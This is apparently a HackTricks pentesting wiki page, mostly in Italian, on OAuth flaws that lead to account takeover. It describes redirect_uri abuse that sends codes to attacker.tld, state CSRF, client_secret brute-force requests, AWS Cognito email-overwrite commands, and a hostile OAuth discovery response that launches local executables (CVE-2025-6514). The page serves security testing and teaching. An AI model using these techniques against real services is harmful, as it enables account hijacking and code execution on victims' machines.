# OAuth to Account takeover

{{#include ../banners/hacktricks-training.md}}

## Informazioni di base <a href="#d4a8" id="d4a8"></a>

OAuth offre diverse versioni; informazioni di base sono disponibili su [OAuth 2.0 documentation](https://oauth.net/2/). Questa discussione si concentra principalmente sul diffuso [OAuth 2.0 authorization code grant type](https://oauth.net/2/grant-types/authorization-code/), fornendo un **framework di autorizzazione che permette a un'applicazione di accedere o eseguire azioni sull'account di un utente in un'altra applicazione** (the authorization server).

Considera un sito ipotetico _**https://example.com**_, progettato per **mostrare tutti i tuoi post sui social media**, inclusi quelli privati. Per fare ciò viene impiegato OAuth 2.0. _https://example.com_ chiederà il tuo permesso per **accedere ai tuoi post sui social media**. Di conseguenza, su _https://socialmedia.com_ apparirà una schermata di consenso che illustra le **autorizzazioni richieste e lo sviluppatore che effettua la richiesta**. Una volta autorizzato, _https://example.com_ ottiene la possibilità di **accedere ai tuoi post per tuo conto**.

È essenziale comprendere i seguenti componenti nel framework OAuth 2.0:

- **resource owner**: Tu, come **utente/entità**, autorizzi l'accesso alla tua risorsa, come i post del tuo account sui social media.
- **resource server**: Il **server che gestisce le richieste autenticate** dopo che l'applicazione ha ottenuto un `access token` per conto del `resource owner`, es. **https://socialmedia.com**.
- **client application**: L'**applicazione che richiede l'autorizzazione** dal `resource owner`, come **https://example.com**.
- **authorization server**: Il **server che emette `access tokens`** al client application a seguito della corretta autenticazione del `resource owner` e dell'ottenimento dell'autorizzazione, es. **https://socialmedia.com**.
- **client_id**: Un identificatore pubblico e univoco per l'applicazione.
- **client_secret:** Una chiave confidenziale, conosciuta solo dall'applicazione e dall'authorization server, usata per generare `access_tokens`.
- **response_type**: Un valore che specifica **il tipo di token richiesto**, come `code`.
- **scope**: Il **livello di accesso** che il client application sta richiedendo al `resource owner`.
- **redirect_uri**: L'**URL su cui l'utente viene reindirizzato dopo l'autorizzazione**. Tipicamente deve corrispondere all'URL di redirect pre-registrato.
- **state**: Un parametro per **mantenere dati durante il reindirizzamento dell'utente verso e dall'authorization server**. La sua unicità è critica per fungere da **meccanismo di protezione CSRF**.
- **grant_type**: Un parametro che indica **il tipo di grant e il tipo di token da restituire**.
- **code**: Il codice di autorizzazione dall'`authorization server`, usato insieme a `client_id` e `client_secret` dall'applicazione client per ottenere un `access_token`.
- **access_token**: Il **token che l'applicazione client usa per le richieste API** per conto del `resource owner`.
- **refresh_token**: Permette all'applicazione di **ottenere un nuovo `access_token` senza richiedere nuovamente all'utente l'autorizzazione**.

### Flusso

Il **flusso OAuth effettivo** procede come segue:

1. Vai su [https://example.com](https://example.com) e selezioni il pulsante “Integra con Social Media”.
2. Il sito invia quindi una richiesta a [https://socialmedia.com](https://socialmedia.com) chiedendo la tua autorizzazione per permettere all'applicazione di https://example.com di accedere ai tuoi post. La richiesta è strutturata come:
```
https://socialmedia.com/auth
?response_type=code
&client_id=example_clientId
&redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
&scope=readPosts
&state=randomString123
```
3. Ti viene quindi presentata una pagina di consenso.
4. Dopo la tua approvazione, Social Media invia una risposta al `redirect_uri` con i parametri `code` e `state`:
```
https://example.com?code=uniqueCode123&state=randomString123
```
5. https://example.com utilizza questo `code`, insieme al suo `client_id` e `client_secret`, per effettuare una richiesta lato server per ottenere un `access_token` per tuo conto, consentendo l'accesso alle autorizzazioni a cui hai acconsentito:
```
POST /oauth/access_token
Host: socialmedia.com
...{"client_id": "example_clientId", "client_secret": "example_clientSecret", "code": "uniqueCode123", "grant_type": "authorization_code"}
```
6. Infine, il processo si conclude quando https://example.com utilizza il tuo `access_token` per effettuare una chiamata API a Social Media per accedere

## Vulnerabilità <a href="#id-323a" id="id-323a"></a>

### Open redirect_uri <a href="#cc36" id="cc36"></a>

Secondo [RFC 6749 §3.1.2](https://www.rfc-editor.org/rfc/rfc6749#section-3.1.2), l'authorization server deve reindirizzare il browser solo verso **URI di redirect pre-registrati e esatti**. Qualsiasi debolezza qui permette a un attacker di inviare una vittima tramite un URL di autorizzazione malevolo affinché l'IdP consegni il `code` (e il `state`) direttamente a un endpoint controllato dall'attaccante, che può poi riscattarlo e raccogliere i token.

Flusso d'attacco tipico:

1. Costruire `https://idp.example/auth?...&redirect_uri=https://attacker.tld/callback` e inviarlo alla vittima.
2. La vittima si autentica e approva gli scopes.
3. L'IdP reindirizza a `attacker.tld/callback?code=<victim-code>&state=...` dove l'attacker registra la richiesta e scambia immediatamente il code.

Bug di validazione comuni da testare:

- **Nessuna validazione** – qualsiasi URL assoluto viene accettato, risultando in furto immediato del code.
- **Controlli deboli con substring/regex sull'host** – bypass con lookalike come `evilmatch.com`, `match.com.evil.com`, `match.com.mx`, `matchAmatch.com`, `evil.com#match.com`, o `match.com@evil.com`.
- **Mismatch IDN homograph** – la validazione avviene sulla forma punycode (`xn--`), ma il browser reindirizza al dominio Unicode controllato dall'attaccante.
- **Percorsi arbitrari su un host consentito** – puntare il `redirect_uri` a `/openredirect?next=https://attacker.tld` o a qualsiasi endpoint XSS/user-content leaks the code tramite redirect concatenati, header Referer, o JavaScript iniettato.
- **Vincoli di directory senza normalizzazione** – pattern come `/oauth/*` possono essere bypassati con `/oauth/../anything`.
- **Wildcard su sottodomini** – accettare `*.example.com` significa che qualsiasi takeover (dangling DNS, S3 bucket, ecc.) fornisce immediatamente un callback valido.
- **Callback non-HTTPS** – permettere `http://` URI dà agli network attackers (Wi-Fi, corporate proxy) l'opportunità di intercettare il `code` in transito.

Esaminare anche parametri accessori in stile redirect (`client_uri`, `policy_uri`, `tos_uri`, `initiate_login_uri`, ecc.) e il documento di discovery OpenID (`/.well-known/openid-configuration`) per endpoint aggiuntivi che potrebbero ereditare gli stessi bug di validazione.

### XSS in redirect implementation <a href="#bda5" id="bda5"></a>

Come menzionato in questo bug bounty report [https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html](https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html) potrebbe essere possibile che l'URL di redirect venga riflesso nella risposta del server dopo che l'utente si autentica, risultando vulnerabile a XSS. Payload possibile da testare:
```
https://app.victim.com/login?redirectUrl=https://app.victim.com/dashboard</script><h1>test</h1>
```
### CSRF - Improper handling of state parameter <a href="#bda5" id="bda5"></a>

Il parametro `state` è il Authorization Code flow CSRF token: il client deve generare un **valore crittograficamente casuale per ogni istanza del browser**, conservarlo in un posto leggibile solo da quel browser (cookie, local storage, ecc.), inviarlo nella richiesta di autorizzazione e rifiutare qualsiasi risposta che non restituisca lo stesso valore. Ogni volta che il valore è statico, prevedibile, opzionale o non legato alla sessione dell’utente, l’attaccante può completare il proprio flusso OAuth, catturare la richiesta finale `?code=` (senza inviarla) e in seguito costringere il browser della vittima a rieseguirla in replay in modo che l’account della vittima venga collegato al profilo dell’attaccante sull’identity provider.

Lo schema di replay è sempre lo stesso:

1. L’attaccante si autentica contro l’IdP con il proprio account e intercetta l’ultimo redirect contenente `code` (e qualsiasi `state`).
2. Scarta quella richiesta, conserva l’URL e più tardi abusa di qualsiasi primitiva CSRF (link, iframe, form che si auto-invia) per forzare il browser della vittima a caricarla.
3. Se il client non applica `state`, l’app consuma il risultato di autorizzazione dell’attaccante e autentica l’attaccante nell’account dell’app della vittima.

Checklist pratica per la gestione di `state` durante i test:

- **Mancanza totale di `state`** – se il parametro non compare mai, l’intero login è vulnerabile a CSRF.
- **`state` non obbligatorio** – rimuovilo dalla richiesta iniziale; se l’IdP emette comunque code che il client accetta, la difesa è opt-in.
- **`state` restituito non validato** – manometti il valore nella risposta (Burp, MITM proxy). Accettare valori discordanti significa che il token memorizzato non viene mai confrontato.
- **`state` prevedibile o puramente a base di dati** – molte app inseriscono percorsi di redirect o blob JSON in `state` senza mischiare entropia, consentendo agli attaccanti di indovinare valori validi e riutilizzare i flussi. Prepend/append sempre forte entropia prima di codificare i dati.
- **`state` fixation** – se l’app permette agli utenti di fornire il valore `state` (es. tramite URL di autorizzazione appositamente costruite) e lo riutilizza durante il flusso, un attaccante può fissare un valore noto e riutilizzarlo contro più vittime.

PKCE può completare `state` (soprattutto per public clients) vincolando l’authorization code a un code verifier, ma i web client devono comunque tracciare `state` per prevenire bug di CSRF/collegamento account cross-user.

### Pre Account Takeover <a href="#ebe4" id="ebe4"></a>

1. **Senza verifica email alla creazione dell’account**: Gli attaccanti possono creare preventivamente un account usando l’email della vittima. Se la vittima in seguito usa un servizio di terze parti per il login, l’applicazione potrebbe collegare involontariamente quell’account di terze parti all’account pre-creato dall’attaccante, portando ad accessi non autorizzati.
2. **Sfruttamento di verifiche email deboli in OAuth**: Gli attaccanti possono sfruttare servizi OAuth che non verificano le email registrandosi e poi cambiando l’email dell’account con quella della vittima. Questo metodo comporta analoghi rischi di accesso non autorizzato, simile al primo scenario ma tramite un vettore diverso.

### Disclosure of Secrets <a href="#e177" id="e177"></a>

Il `client_id` è intenzionalmente pubblico, ma il **`client_secret` non deve mai essere recuperabile dagli utenti finali**. Deployment di Authorization Code che incorporano il secret in **mobile APK, desktop client o single-page app** consegnano di fatto quella credenziale a chiunque possa scaricare il pacchetto. Ispeziona sempre i public clients tramite:

- Unpacking dell’APK/IPA, installer desktop o app Electron e grep per `client_secret`, blob Base64 che decodificano in JSON, o endpoint OAuth hard-coded.
- Revisione dei file di config inclusi (plist, JSON, XML) o stringhe decompilate alla ricerca di credenziali client.

Una volta che l’attaccante estrae il secret gli basta rubare qualsiasi `code` di autorizzazione della vittima (via un redirect_uri debole, logs, ecc.) per colpire `/token` in autonomia e ottenere access/refresh token senza coinvolgere l’app legittima. Considera i public/native clients come **incapaci di trattenere segreti**—dovrebbero invece affidarsi a PKCE (RFC 7636) per provare il possesso di un code verifier per istanza invece di un secret statico. Durante i test, verifica se PKCE è obbligatorio e se il backend rifiuta effettivamente gli scambi token che omettono sia il `client_secret` **o** un valido `code_verifier`.

### Client Secret Bruteforce

You can try to **bruteforce the `client_secret`** of a service provider with the identity provider in order to be try to steal accounts.\
The request to BF may look similar to:
```
POST /token HTTP/1.1
content-type: application/x-www-form-urlencoded
host: 10.10.10.10:3000
content-length: 135
Connection: close

code=77515&redirect_uri=http%3A%2F%2F10.10.10.10%3A3000%2Fcallback&grant_type=authorization_code&client_id=public_client_id&client_secret=[bruteforce]
```
### Artefatti Referer/Header/Location leaking Code + State

Una volta che il client ha il **code and state**, se compaiono in **`location.href`** o **`document.referrer`** e vengono inoltrati a terze parti, leakano. Due pattern ricorrenti:

- **Classic Referer leak**: dopo il redirect OAuth, qualsiasi navigazione che mantiene `?code=&state=` nell'URL li inserirà nell'header **Referer** inviato a CDN/analytics/ads.
- **Telemetry/analytics confused deputy**: alcuni SDK (pixel/JS logger) reagiscono a eventi `postMessage` e poi **inviare l'attuale `location.href`/`referrer` alle API di backend usando un token fornito nel messaggio`**. Se puoi iniettare il tuo token in quel flusso (es. tramite un attacker-controlled postMessage relay), poi puoi leggere la cronologia/log delle richieste API dello SDK e recuperare gli OAuth artifacts della vittima presenti in quelle richieste.


### Access Token Stored in Browser History

La garanzia centrale della Authorization Code grant è che **access tokens never reach the resource owner’s browser**. Quando le implementazioni leakano token lato client, qualsiasi bug minore (XSS, Referer leak, proxy logging) diventa compromissione immediata dell'account. Controlla sempre:

- **Tokens in URLs** – se `access_token` appare nella query/fragment, finisce nella cronologia del browser, server logs, analytics e negli header Referer inviati a terze parti.
- **Tokens transiting untrusted middleboxes** – restituire token via HTTP o attraverso debugging/corporate proxies permette agli osservatori di rete di catturarli direttamente.
- **Tokens stored in JavaScript state** – store React/Vue, variabili globali, o blob JSON serializzati espongono i token a ogni script sull'origine (inclusi payload XSS o estensioni dannose).
- **Tokens persisted in Web Storage** – `localStorage`/`sessionStorage` mantengono i token molto dopo il logout su dispositivi condivisi e sono accessibili via script.

Qualsiasi di queste evidenze solitamente eleva bug altrimenti “low” (come un CSP bypass o DOM XSS) a full API takeover perché l'attaccante può semplicemente leggere e riutilizzare il bearer token leakato.

### Everlasting Authorization Code

Authorization codes devono essere **short-lived, single-use, and replay-aware**. Quando valuti un flow, cattura un `code` e:

- **Test the lifetime** – RFC 6749 raccomanda minuti, non ore. Prova a riscattare il code dopo 5–10 minuti; se funziona ancora, la finestra di esposizione per qualsiasi code leakato è eccessiva.
- **Test sequential reuse** – invia lo stesso `code` due volte. Se la seconda richiesta restituisce un altro token, gli attaccanti possono clonare sessioni indefinitamente.
- **Test concurrent redemption/race conditions** – lancia due richieste token in parallelo (Burp intruder, turbo intruder). Issuer deboli a volte concedono entrambi.
- **Observe replay handling** – un tentativo di riuso non dovrebbe solo fallire ma anche revocare qualsiasi token già coniato da quel code. Altrimenti, un replay rilevato lascia attivo il primo token dell'attaccante.

Combinare un code permissivo al replay con qualsiasi `redirect_uri` o bug di logging permette accesso persistente agli account anche dopo che la vittima completa il login legittimo.

### Authorization/Refresh Token not bound to client

Se puoi ottenere l'**authorization code** e riscattarlo per un client/app differente, puoi takeover altri account. Testa il weak binding:

- Catturare un `code` per **app A** e inviarlo all'token endpoint di **app B**; se ricevi comunque un token, il binding dell'audience è rotto.
- Provare endpoint di minting token first-party che dovrebbero essere limitati ai loro propri client IDs; se accettano `state`/`app_id` arbitrari mentre validano solo il code, effettui di fatto un **authorization-code swap** per mintare token first-party con privilegi elevati.
- Verificare se il client binding ignora mismatch di nonce/redirect URI. Se una pagina di errore carica comunque SDK che loggano `location.href`, combina con Referer/telemetry leaks per rubare code e riscattarli altrove.

Qualsiasi endpoint che scambia `code` → token **deve** verificare il client che ha emesso, il redirect URI e il nonce; altrimenti, un code rubato da qualsiasi app può essere upgradato a un first-party access token.

### Happy Paths, XSS, Iframes & Post Messages to leak code & state values

[**Check this post**](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url)

### AWS Cognito <a href="#bda5" id="bda5"></a>

In questo bug bounty report: [**https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/**](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/) puoi vedere che il **token** che **AWS Cognito** restituisce all'utente potrebbe avere **sufficienti permessi per sovrascrivere i dati utente**. Quindi, se puoi **cambiare l'email di un utente con una email controllata dall'attaccante**, potresti essere in grado di **take over** gli account di altri.
```bash
# Read info of the user
aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]

# Change email address
aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=imaginary@flickr.com
{
"CodeDeliveryDetailsList": [
{
"Destination": "i***@f***.com",
"DeliveryMedium": "EMAIL",
"AttributeName": "email"
}
]
}
```
Per informazioni più dettagliate su come abusare AWS Cognito controlla [AWS Cognito - Unauthenticated Enum Access](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html).

### Abuso dei token di altre App <a href="#bda5" id="bda5"></a>

Come [**mentioned in this writeup**](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts), i flussi OAuth che si aspettano di ricevere il **token** (e non un `code`) potrebbero essere vulnerabili se non verificano che il token appartenga all'app.

Questo perché un **attaccante** potrebbe creare un'**applicazione che supporta OAuth e il login con Facebook** (per esempio) nella propria applicazione. Poi, una volta che una vittima esegue il login con Facebook nell'**applicazione dell'attaccante**, l'attaccante potrebbe ottenere il **OAuth token** dell'utente dato alla sua applicazione, e usarlo per autenticarsi nell'app OAuth della vittima utilizzando il token dell'utente della vittima.

> [!CAUTION]
> Pertanto, se l'attaccante riesce a far accedere l'utente alla propria applicazione OAuth, potrà prendere il controllo dell'account della vittima in applicazioni che si aspettano un token e non verificano se il token è stato concesso al loro app ID.

### Two links & cookie <a href="#bda5" id="bda5"></a>

Secondo [**this writeup**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), era possibile far aprire a una vittima una pagina con una **returnUrl** che punta all'host dell'attaccante. Queste informazioni verrebbero **memorizzate in un cookie (RU)** e in un **passo successivo** il **prompt** chiederà all'**utente** se vuole concedere l'accesso a quell'host dell'attaccante.

Per bypassare questo prompt, era possibile aprire una tab per iniziare il **Oauth flow** che avrebbe impostato questo cookie RU usando la **returnUrl**, chiudere la tab prima che il prompt venisse mostrato, e aprire una nuova tab senza quel valore. In quel modo il **prompt non informerà dell'host dell'attaccante**, ma il cookie sarebbe impostato su di esso, quindi il **token verrà inviato all'host dell'attaccante** nella redirezione.

### Prompt Interaction Bypass <a href="#bda5" id="bda5"></a>

Come spiegato in [**this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), alcune implementazioni OAuth permettono di indicare il parametro GET **`prompt`** come None (**`&prompt=none`**) per **impedire che agli utenti venga chiesto di confermare** l'accesso richiesto in un prompt sul web se sono già loggati sulla piattaforma.

### response_mode

Come [**explained in this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), potrebbe essere possibile indicare il parametro **`response_mode`** per specificare dove vuoi che il `code` venga fornito nell'URL finale:

- `response_mode=query` -> Il `code` viene fornito all'interno di un parametro GET: `?code=2397rf3gu93f`
- `response_mode=fragment` -> Il `code` viene fornito all'interno del fragment dell'URL `#code=2397rf3gu93f`
- `response_mode=form_post` -> Il `code` viene fornito all'interno di un form POST con un input chiamato `code` e relativo valore
- `response_mode=web_message` -> Il `code` viene inviato in un postMessage: `window.opener.postMessage({"code": "asdasdasd...`

### Clickjacking OAuth consent dialogs

I dialog di consenso/login OAuth sono bersagli ideali per il Clickjacking: se possono essere incorniciati, un attaccante può sovrapporre grafica personalizzata, nascondere i veri pulsanti e indurre gli utenti ad approvare scope pericolosi o a collegare account. Costruisci PoC che:

1. Caricano l'URL di autorizzazione IdP dentro un `<iframe sandbox="allow-forms allow-scripts allow-same-origin">`.
2. Usino trucchi di posizionamento assoluto/opacità per allineare pulsanti falsi con i controlli nascosti **Allow**/**Approve**.
3. Opzionalmente precompilino parametri (scopes, redirect URI) in modo che l'approvazione rubata avvantaggi immediatamente l'attaccante.

Durante i test verifica che le pagine IdP emettano `X-Frame-Options: DENY/SAMEORIGIN` oppure una `Content-Security-Policy: frame-ancestors 'none'` restrittiva. Se nessuna è presente, dimostra il rischio con tool come [NCC Group’s clickjacking PoC generator](https://github.com/nccgroup/clickjacking-poc) e registra quanto facilmente una vittima autorizza l'app dell'attaccante. Per ulteriori idee di payload vedi [Clickjacking](clickjacking.md).

### OAuth ROPC flow - 2 FA bypass <a href="#b440" id="b440"></a>

Secondo [**this blog post**](https://cybxis.medium.com/a-bypass-on-gitlabs-login-email-verification-via-oauth-ropc-flow-e194242cad96), questo è un OAuth flow che permette di effettuare il login via **username** e **password**. Se durante questo semplice flow viene restituito un **token** con accesso a tutte le azioni che l'utente può eseguire, allora è possibile bypassare la 2FA usando quel token.

### ATO on web page redirecting based on open redirect to referrer <a href="#bda5" id="bda5"></a>

Questo [**blogpost**](https://blog.voorivex.team/oauth-non-happy-path-to-ato) spiega come sia stato possibile abusare di un **open redirect** usando il valore del **referrer** per sfruttare OAuth e ottenere un ATO. L'attacco era:

1. La vittima accede alla pagina web dell'attaccante
2. La vittima apre il link malevolo e un opener avvia il Google OAuth flow con `response_type=id_token,code&prompt=none` come parametri aggiuntivi usando come **referrer il sito dell'attaccante**.
3. Nell'opener, dopo che il provider autorizza la vittima, la invia indietro al valore del parametro `redirect_uri` (sito della vittima) con un codice 30X che mantiene comunque il sito dell'attaccante nel referer.
4. Il sito della vittima **innesca l'open redirect basandosi sul referrer** reindirizzando l'utente vittima al sito dell'attaccante; poiché il **`respose_type`** era **`id_token,code`**, il `code` verrà inviato all'attaccante nel **fragment** dell'URL permettendogli di prendere il controllo dell'account dell'utente tramite Google nel sito della vittima.

### SSRFs parameters <a href="#bda5" id="bda5"></a>

[**Check this research**](https://portswigger.net/research/hidden-oauth-attack-vectors) **Per ulteriori dettagli su questa tecnica.**

Dynamic Client Registration in OAuth funge da vettore meno ovvio ma critico per vulnerabilità di sicurezza, in particolare per attacchi di **Server-Side Request Forgery (SSRF)**. Questo endpoint permette ai server OAuth di ricevere dettagli sulle client applications, incluse URL sensibili che possono essere sfruttate.

Punti chiave:

- **Dynamic Client Registration** è spesso esposta su `/register` e accetta dettagli come `client_name`, `client_secret`, `redirect_uris`, e URL per i logo o JSON Web Key Sets (JWKs) tramite richieste POST.
- Questa funzionalità aderisce alle specifiche definite in **RFC7591** e **OpenID Connect Registration 1.0**, che includono parametri potenzialmente vulnerabili a SSRF.
- Il processo di registrazione può inavvertitamente esporre i server a SSRF in diversi modi:
- **`logo_uri`**: un URL per il logo dell'app client che potrebbe essere richiesto dal server, causando SSRF o portando a XSS se l'URL è gestito male.
- **`jwks_uri`**: un URL al documento JWK del client, che se creato in modo malevolo può far sì che il server effettui richieste outbound verso un server controllato dall'attaccante.
- **`sector_identifier_uri`**: fa riferimento a un array JSON di `redirect_uris`, che il server potrebbe fetchare, creando un'opportunità SSRF.
- **`request_uris`**: elenca request URIs per il client, che possono essere sfruttate se il server recupera questi URI all'inizio del processo di autorizzazione.

Strategia di sfruttamento:

- SSRF può essere innescato registrando un nuovo client con URL malevoli in parametri come `logo_uri`, `jwks_uri` o `sector_identifier_uri`.
- Sebbene lo sfruttamento diretto tramite `request_uris` possa essere mitigato da controlli di whitelist, fornire un `request_uri` pre-registrato e controllato dall'attaccante può facilitare SSRF durante la fase di autorizzazione.

### OAuth/OIDC Discovery URL Abuse & OS Command Execution

La ricerca su [CVE-2025-6514](https://amlalabs.com/blog/oauth-cve-2025-6514/) (che impatta client `mcp-remote` come Claude Desktop, Cursor o Windsurf) mostra come la discovery OAuth dinamica diventi una primitive RCE ogni volta che il client inoltra i metadata IdP direttamente al sistema operativo. Il server MCP remoto ritorna un `authorization_endpoint` controllato dall'attaccante durante lo scambio di discovery (`/.well-known/openid-configuration` o qualunque metadata RPC). `mcp-remote ≤0.1.15` poi invocava l'handler URL del sistema (`start`, `open`, `xdg-open`, ecc.) con qualunque stringa arrivasse, dunque qualsiasi scheme/path supportato dall'OS veniva eseguito localmente.

Workflow d'attacco

1. Punta l'agente desktop verso un server MCP/OAuth ostile (`npx mcp-remote https://evil`). L'agente riceve `401` più metadata.
2. Il server risponde con un JSON come:
```
HTTP/1.1 200 OK
Content-Type: application/json

{
"authorization_endpoint": "file:/c:/windows/system32/calc.exe",
"token_endpoint": "https://evil/idp/token",
...
}
```
3. Il client avvia l'OS handler per la URI fornita. Windows accetta payload come `file:/c:/windows/system32/calc.exe /c"powershell -enc ..."`; macOS/Linux accettano `file:///Applications/Calculator.app/...` o anche schemi personalizzati come `cmd://bash -lc '<payload>'` se registrati.
4. Poiché ciò avviene prima di qualsiasi interazione dell'utente, **basta configurare il client per comunicare con il server dell'attaccante per ottenere code execution**.

**Come testare**

- Mira a qualsiasi desktop/agent compatibile con OAuth che esegue discovery su HTTP(S) e apre gli endpoint restituiti localmente (Electron apps, CLI helpers, thick clients).
- Intercetta o ospita la risposta di discovery e sostituisci `authorization_endpoint`, `device_authorization_endpoint`, o campi simili con `file://`, `cmd://`, percorsi UNC, o altri schemi pericolosi.
- Osserva se il client valida lo scheme/host. La mancanza di validazione provoca l'esecuzione immediata nel contesto dell'utente e dimostra il problema.
- Ripeti con schemi differenti per mappare l'intera superficie d'attacco (es., `ms-excel:`, `data:text/html,`, custom protocol handlers) e dimostrare la portata cross-platform.

## OAuth providers Race Conditions

Se la piattaforma che stai testando è un OAuth provider [**read this to test for possible Race Conditions**](race-condition.md).

## Mutable Claims Attack

In OAuth, il campo sub identifica in modo univoco un utente, ma il suo formato varia a seconda dell'Authorization Server. Per standardizzare l'identificazione degli utenti, alcuni client usano email o user handle. Tuttavia, questo è rischioso perché:

- Alcuni Authorization Server non garantiscono che queste proprietà (come l'email) rimangano immutabili.
- In alcune implementazioni—come **"Login with Microsoft"**—il client si affida al campo email, che è **controllato dall'utente in Entra ID** e non è verificato.
- Un attaccante può sfruttare questo creando la propria organizzazione Azure AD (es., doyensectestorg) e usandola per eseguire un Microsoft login.
- Anche se l'Object ID (memorizzato in sub) è immutabile e sicuro, il fare affidamento su un campo email mutabile può consentire un account takeover (per esempio, dirottando un account come victim@gmail.com).

## Client Confusion Attack

In una **Client Confusion Attack**, un'app che usa l'OAuth Implicit Flow non verifica che l'access token finale sia stato generato specificamente per il proprio Client ID. Un attaccante mette su un sito pubblico che usa Google’s OAuth Implicit Flow, inducendo migliaia di utenti a autenticarsi e raccogliendo così access token destinati al sito dell'attaccante. Se quegli utenti hanno anche account su un altro sito vulnerabile che non valida il Client ID del token, l'attaccante può riutilizzare i token raccolti per impersonare le vittime e prendere il controllo dei loro account.

## Scope Upgrade Attack

Il tipo **Authorization Code Grant** prevede comunicazioni sicure server-to-server per la trasmissione dei dati utente. Tuttavia, se l'**Authorization Server** si fida implicitamente di un parametro scope nella Access Token Request (un parametro non definito nell'RFC), un'applicazione malevola potrebbe elevare i privilegi di un authorization code richiedendo uno scope più alto. Dopo che l'**Access Token** è stato generato, il **Resource Server** deve verificarlo: per token JWT questo implica controllare la firma JWT ed estrarre dati come client_id e scope, mentre per token rappresentati da stringhe casuali il server deve interrogare l'Authorization Server per recuperare i dettagli del token.

## Redirect Scheme Hijacking

Nelle implementazioni OAuth mobile, le app usano **custom URI schemes** per ricevere redirect con Authorization Codes. Tuttavia, poiché più app possono registrare lo stesso scheme su un dispositivo, l'assunzione che solo il client legittimo controlli la redirect URI viene violata. Su Android, per esempio, un Intent URI come `com.example.app://` viene intercettato in base allo scheme e ai filtri opzionali definiti nell'intent-filter di un'app. Poiché la risoluzione degli intent di Android può essere ampia—soprattutto se è specificato solo lo scheme—un attaccante può registrare un'app malevola con un intent filter costruito ad arte per hijackare l'authorization code. Questo può **enable an account takeover** sia tramite interazione dell'utente (quando più app sono idonee a gestire l'intent) sia tramite tecniche di bypass che sfruttano filtri eccessivamente permissivi, come dettagliato nel flowchart di Ostorlab.

## Riferimenti

- [**https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1**](https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1)
- [**https://portswigger.net/research/hidden-oauth-attack-vectors**](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [**https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html**](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)
- [An Offensive Guide to the OAuth 2.0 Authorization Code Grant](https://www.nccgroup.com/research-blog/an-offensive-guide-to-the-authorization-code-grant/)
- [OAuth Discovery as an RCE Vector (Amla Labs)](https://amlalabs.com/blog/oauth-cve-2025-6514/)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)

{{#include ../banners/hacktricks-training.md}}
